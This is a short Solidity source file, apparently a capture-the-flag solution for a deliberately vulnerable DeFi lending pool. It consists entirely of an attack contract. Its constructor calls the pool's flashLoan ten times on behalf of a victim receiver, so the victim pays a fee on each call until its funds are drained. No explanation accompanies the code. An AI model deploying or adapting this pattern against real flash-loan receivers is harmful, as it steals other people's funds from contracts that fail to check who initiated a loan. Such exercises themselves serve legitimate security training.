// SPDX-License-Identifier: MIT 
pragma solidity >=0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract AttackFlashLoanReceiver {
    address private constant hackedToken =
        0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address _pool, address _hackedReceiver) {
        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(payable(_pool));

        for (uint i = 0; i < 10; i++) {
            pool.flashLoan(
                IERC3156FlashBorrower(_hackedReceiver),
                hackedToken,
                0,
                "0x"
            );
        }
    }
}
